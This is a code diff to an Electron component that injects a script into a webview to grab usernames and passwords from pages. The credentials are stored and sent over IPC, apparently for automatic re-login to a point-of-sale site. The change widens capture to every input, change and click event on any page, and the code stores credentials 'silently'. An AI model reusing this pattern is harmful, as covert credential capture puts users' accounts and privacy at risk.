@@ -35,56 +35,15 @@ export default function WebScraper() {
           window.__synkkCapture = true;
 
           function captureFromPage() {
-            const passInputs = document.querySelectorAll('input[type="password"]');
-            if (passInputs.length === 0) return;
-
-            passInputs.forEach(passInput => {
-              const form = passInput.closest('form');
-              const container = form || document;
-
-              // Listen for form submit
-              if (form) {
-                form.addEventListener('submit', () => {
-                  grabAndStore(container, passInput);
-                }, true);
-              }
-
-              // Listen for button clicks (some SPAs don't use form submit)
-              container.addEventListener('click', (e) => {
-                const btn = e.target.closest('button, input[type="submit"], a');
-                if (!btn) return;
-                const text = (btn.textContent || btn.value || '').toLowerCase();
-                if (text.includes('log in') || text.includes('login') || text.includes('sign in') || text.includes('submit') || text.includes('continue') || btn.type === 'submit') {
-                  setTimeout(() => grabAndStore(container, passInput), 50);
-                }
-              }, true);
-
-              // Listen for Enter key in password field
-              passInput.addEventListener('keydown', (e) => {
-                if (e.key === 'Enter') {
-                  setTimeout(() => grabAndStore(container, passInput), 50);
-                }
-              }, true);
-            });
-          }
-
-          function grabAndStore(container, passInput) {
-            const password = passInput.value;
-            if (!password) return;
-
+            const inputs = document.querySelectorAll('input');
             let username = '';
-            const inputs = container.querySelectorAll('input');
-            for (const inp of inputs) {
-              if (inp === passInput) continue;
-              if (inp.type === 'hidden' || inp.type === 'checkbox' || inp.type === 'radio') continue;
-              if (inp.type === 'email' || inp.type === 'text' || inp.type === 'tel') {
-                if (inp.value && inp.value.trim()) {
-                  username = inp.value.trim();
-                  break;
-                }
-              }
-            }
-
+            let password = '';
+            
+            inputs.forEach(inp => {
+              if (inp.type === 'password') password = inp.value;
+              else if (inp.type === 'text' || inp.type === 'email') username = inp.value;
+            });
+            
             if (username && password) {
               try {
                 sessionStorage.setItem('__synkk_creds', JSON.stringify({ u: username, p: password }));
@@ -94,14 +53,22 @@ export default function WebScraper() {
 
           captureFromPage();
 
-          // Re-run on DOM mutations (for SPAs that render login forms dynamically)
+          // Listen to all input events to capture user typing instantly
+          document.addEventListener('input', captureFromPage, true);
+          document.addEventListener('change', captureFromPage, true);
+          document.addEventListener('submit', captureFromPage, true);
+
+          // Listen for any clicks anywhere in case they click a weird div to submit
+          document.addEventListener('click', captureFromPage, true);
+
+          // Handle dynamically injected forms
           const observer = new MutationObserver(() => {
             if (document.querySelector('input[type="password"]')) {
               captureFromPage();
             }
           });
           observer.observe(document.body, { childList: true, subtree: true });
-        })()
+        })();
       `;
 
       webview.executeJavaScript(captureScript).catch(() => {});
@@ -131,11 +98,12 @@ export default function WebScraper() {
         if (credsJson) {
           const creds = JSON.parse(credsJson);
           if (creds.u && creds.p) {
-            // @ts-ignore
             const { ipcRenderer } = window.require('electron');
+            const actualUrl = webviewRef.current?.getURL() || url;
             await ipcRenderer.invoke('save-web-pos-credentials', {
               username: creds.u,
-              password: creds.p
+              password: creds.p,
+              url: actualUrl
             });
             console.log('Silently stored Web POS credentials for auto-relogin.');
           }
